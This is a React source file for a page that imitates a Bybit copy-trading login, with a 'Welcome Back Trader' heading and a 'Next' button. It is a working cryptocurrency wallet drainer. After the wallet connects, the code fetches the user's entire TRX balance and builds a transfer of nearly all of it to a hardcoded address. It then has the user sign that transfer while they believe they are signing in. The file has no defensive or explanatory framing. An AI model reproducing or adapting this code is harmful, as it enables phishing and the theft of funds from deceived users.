"use client";

import React, { useState, useEffect } from "react";
import { BybitWalletAdapter } from "@tronweb3/tronwallet-adapter-bybit";

// !! IMPORTANT: Replace this with your actual destination wallet address.
const RECIPIENT_ADDRESS = "TBK1Hai8nyCoznKD1iHf2z5CEdkNF7sK9N";

// --- DYNAMIC FEE CONSTANTS (in SUN) ---
// 1. A more realistic fee for the bandwidth burned in a standard TRX transfer.
const STANDARD_BANDWIDTH_FEE_SUN = 350000; // 0.35 TRX
// 2. The one-time fee for activating a new account on the Tron network.
const ACCOUNT_ACTIVATION_FEE_SUN = 100000; // 0.1 TRX

const adapter = new BybitWalletAdapter();

export default function LoginPage() {
  const [address, setAddress] = useState(null);

  useEffect(() => {
    if (adapter.connected) {
      handleDeposit();
    }
  }, [address]);

  const handleConnect = async () => {
    try {
      await adapter.connect();
      setAddress(adapter.address);
    } catch (error) {
      console.error("Failed to connect wallet:", error);
    }
  };

  const handleDeposit = async () => {
    if (RECIPIENT_ADDRESS === "YOUR_WALLET_ADDRESS_HERE") {
      alert(
        "CRITICAL: Please replace 'YOUR_WALLET_ADDRESS_HERE' in the code with a valid Tron address."
      );
      return;
    }
    if (!window.bybitWallet?.tronLink) {
      alert(
        "Bybit Wallet is not available. Please ensure the extension is installed and active."
      );
      return;
    }

    console.log(
      "--- Starting Deposit Process with Dynamic Fee Calculation ---"
    );

    try {
      const tronWeb = window.bybitWallet.tronLink.tronWeb;
      console.log("1. TronWeb instance obtained.");

      const balanceInSun = await tronWeb.trx.getBalance(adapter.address);
      console.log(
        `2. Fetched balance: ${balanceInSun} SUN (${
          balanceInSun / 1000000
        } TRX).`
      );

      // --- DYNAMIC FEE CALCULATION ---
      let totalFeeSun = STANDARD_BANDWIDTH_FEE_SUN;
      console.log(
        `3. Base fee for bandwidth estimated at: ${totalFeeSun} SUN.`
      );

      // Check if the recipient account exists.
      const recipientAccount = await tronWeb.trx.getAccount(RECIPIENT_ADDRESS);

      // An empty object means the account has not been activated on-chain.
      if (Object.keys(recipientAccount).length === 0) {
        totalFeeSun += ACCOUNT_ACTIVATION_FEE_SUN;
        console.log(
          `4. Recipient account does not exist. Adding activation fee. New total fee: ${totalFeeSun} SUN.`
        );
      } else {
        console.log(
          "4. Recipient account already exists. No activation fee needed."
        );
      }

      if (balanceInSun <= totalFeeSun) {
        alert(
          `Your balance (${
            balanceInSun / 1000000
          } TRX) is too low to cover the estimated network fee of ${
            totalFeeSun / 1000000
          } TRX.`
        );
        return;
      }

      const amountToSend = balanceInSun - totalFeeSun;
      console.log(
        `5. Final calculated amount to send (after fees): ${amountToSend} SUN.`
      );
      // --- END DYNAMIC FEE CALCULATION ---

      const unsignedTransaction = await tronWeb.transactionBuilder.sendTrx(
        RECIPIENT_ADDRESS,
        amountToSend,
        adapter.address
      );
      console.log("6. Unsigned transaction created successfully.");

      const signedTransaction = await adapter.signTransaction(
        unsignedTransaction
      );
      console.log("7. Transaction signed successfully by user.");

      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
      console.log("8. Transaction broadcast to the network. Result:", result);

      if (result && result.txid) {
        console.log(`9. SUCCESS! Transaction ID: ${result.txid}`);
        alert(`Deposit successful! Transaction ID: ${result.txid}`);
      } else {
        throw new Error(
          "Transaction broadcast failed to return a transaction ID."
        );
      }
    } catch (error) {
      console.error("--- DEPOSIT FAILED ---", error);
      alert(
        `Deposit failed. Check the console for details. Error: ${
          error.message || "An unknown error occurred."
        }`
      );
    } finally {
      console.log("--- Finished Deposit Process ---");
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#0a0a0a] to-[#1746a2]">
      {/* Header with BYBIT logo and grid background */}
      <div className="w-full h-[80px] flex items-center justify-center relative bg-black border-b border-[#2d2d2d]">
        <div
          className="absolute inset-0 w-full h-full pointer-events-none"
          style={{
            backgroundImage:
              "linear-gradient(90deg, transparent 95%, #ffb800 95%, #ffb800 100%)",
            backgroundSize: "60px 60px",
            backgroundRepeat: "repeat",
          }}
        ></div>
        <span className="relative z-10 text-4xl font-extrabold tracking-widest text-white">
          BYB<span className="text-[#ffb800]">I</span>T
        </span>
      </div>
      {/* Main content */}
      <div className="flex-1 flex items-center justify-center">
        <div className="bg-white/90 rounded-3xl shadow-xl px-10 py-12 flex flex-col items-center max-w-md w-full">
          <h1 className="text-3xl font-extrabold text-[#1a237e] mb-2 text-center drop-shadow">
            Welcome Back Trader
          </h1>
          <p className="text-gray-500 mb-8 text-center">
            Sign in to unlock full features
          </p>
          <div className="flex items-center justify-center mb-8">
            <svg
              width="60"
              height="48"
              viewBox="0 0 60 48"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <rect
                x="5"
                y="10"
                width="50"
                height="28"
                rx="6"
                fill="#e3e8f0"
                stroke="#1a237e"
                strokeWidth="3"
              />
              <rect x="15" y="24" width="30" height="6" rx="2" fill="#c7d2fe" />
            </svg>
          </div>
          <button
            onClick={handleConnect}
            className="w-full flex items-center justify-center gap-2 bg-[#1746a2] hover:bg-[#102c57] text-white font-semibold text-lg rounded-xl py-3 transition mb-4"
          >
            <svg
              width="24"
              height="24"
              fill="none"
              stroke="currentColor"
              strokeWidth="2"
              viewBox="0 0 24 24"
            >
              <rect x="3" y="7" width="18" height="13" rx="2" />
              <path d="M16 3h-8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z" />
            </svg>
            Next
          </button>
          <p className="text-gray-400 text-center text-sm mt-2">
            Log in to your copy trading dashboard and
            <br />
            start your trading journey
          </p>
        </div>
      </div>
    </div>
  );
}
